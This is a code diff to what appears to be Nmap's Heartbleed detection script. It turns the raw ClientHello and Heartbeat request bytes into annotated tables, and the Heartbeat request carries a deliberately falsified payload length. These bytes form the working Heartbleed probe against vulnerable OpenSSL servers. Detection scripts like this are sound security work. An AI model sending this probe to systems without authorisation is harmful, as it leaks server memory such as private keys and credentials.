@@ -32,6 +32,7 @@ local shortport = require('shortport')
 local sslcert = require('sslcert')
 local stdnse = require('stdnse')
 local string = require('string')
+local table = require('table')
 local vulns = require('vulns')
 
 author = "Patrik Karlsson <patrik@cqure.net>"
@@ -74,23 +75,98 @@ OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1
     }
   }
 
-  local hello = bin.pack('H', [[16 03 02 00  dc 01 00 00 d8 03 02 53
-    43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
-    bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
-    00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
-    00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
-    c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
-    c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
-    c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
-    c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
-    00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
-    03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
-    00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
-    00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
-    00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-    00 0f 00 01 01]])
+  local hello = bin.pack('H', table.concat(
+      {
+        "16", --handshake ContentType
+        "03 02", -- TLSv1.1
+        "00 dc", -- record length
+        "01", -- handshake type ClientHello
+        "00 00 d8", -- body length
+        "03 02", -- TLSv1.1
+        "53 43 5b 90", -- date/time (Tue Apr  8 02:14:40 2014)
+        "9d9b720bbc0cbc2b92a84897cfbd3904cc160a8503909f770433d4de", -- random
+        "00", -- session ID
+        "00 66", -- cipher suites length (102 = 51 suites)
+        "c0 14", -- TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
+        "c0 0a", -- TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
+        "c0 22", -- TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
+        "c0 21", -- TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
+        "00 39", -- TLS_DHE_RSA_WITH_AES_256_CBC_SHA
+        "00 38", -- TLS_DHE_DSS_WITH_AES_256_CBC_SHA
+        "00 88", -- TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
+        "00 87", -- TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
+        "c0 0f", -- TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
+        "c0 05", -- TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
+        "00 35", -- TLS_RSA_WITH_AES_256_CBC_SHA
+        "00 84", -- TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
+        "c0 12", -- TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
+        "c0 08", -- TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
+        "c0 1c", -- TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
+        "c0 1b", -- TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
+        "00 16", -- TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+        "00 13", -- TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
+        "c0 0d", -- TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
+        "c0 03", -- TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
+        "00 0a", -- TLS_RSA_WITH_3DES_EDE_CBC_SHA
+        "c0 13", -- TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
+        "c0 09", -- TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
+        "c0 1f", -- TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
+        "c0 1e", -- TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
+        "00 33", -- TLS_DHE_RSA_WITH_AES_128_CBC_SHA
+        "00 32", -- TLS_DHE_DSS_WITH_AES_128_CBC_SHA
+        "00 9a", -- TLS_DHE_RSA_WITH_SEED_CBC_SHA
+        "00 99", -- TLS_DHE_DSS_WITH_SEED_CBC_SHA
+        "00 45", -- TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
+        "00 44", -- TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
+        "c0 0e", -- TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
+        "c0 04", -- TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
+        "00 2f", -- TLS_RSA_WITH_AES_128_CBC_SHA
+        "00 96", -- TLS_RSA_WITH_SEED_CBC_SHA
+        "00 41", -- TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
+        "c0 11", -- TLS_ECDHE_RSA_WITH_RC4_128_SHA
+        "c0 07", -- TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
+        "c0 0c", -- TLS_ECDH_RSA_WITH_RC4_128_SHA
+        "c0 02", -- TLS_ECDH_ECDSA_WITH_RC4_128_SHA
+        "00 05", -- TLS_RSA_WITH_RC4_128_SHA
+        "00 04", -- TLS_RSA_WITH_RC4_128_MD5
+        "00 15", -- TLS_DHE_RSA_WITH_DES_CBC_SHA
+        "00 12", -- TLS_DHE_DSS_WITH_DES_CBC_SHA
+        "00 09", -- TLS_RSA_WITH_DES_CBC_SHA
+        "00 14", -- TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
+        "00 11", -- TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
+        "00 08", -- TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
+        "00 06", -- TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
+        "00 03", -- TLS_RSA_EXPORT_WITH_RC4_40_MD5
+        "00 ff", -- TLS_EMPTY_RENEGOTIATION_INFO_SCSV (RFC 5746)
+        "01", -- compressors length
+        "00", -- NULL compressor
+        "00 49", -- extensions length
+        "00 0b", -- ec_point_formats
+        "00 04", -- ec_point_formats length
+        "03", -- point formats length
+        "00", -- ec_point_formats uncompressed
+        "01", -- ec_point_formats ansiX962_compressed_prime
+        "02", -- ec_point_formats ansiX962_compressed_char2
+        "00 0a", -- elliptic_curves
+        "00 34", -- elliptic_curves length
+        "00 32", -- elliptic curves length
+        "00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11", -- elliptic_curves data (all curves)
+        "00 23", -- SessionTicket TLS
+        "00 00", -- SessionTicket length
+        "00 0f", -- heartbeat
+        "00 01", -- heartbeat length
+        "01", -- heartbeat data: peer_allowed_to_send
+      })
+    )
 
-  local hb = bin.pack('H', '18 03 02 00 03 01 40 00')
+  local hb = bin.pack('H', table.concat({
+        "18", -- Heartbeat ContentType
+        "03 02", -- TLSv1.1
+        "00 03", -- record length
+        "01", -- HeartbeatType HeartbeatRequest
+        "40 00", -- payload length (falsified)
+      })
+    )
 
   local report = vulns.Report:new(SCRIPT_NAME, host, port)
   local s = nmap.new_socket()
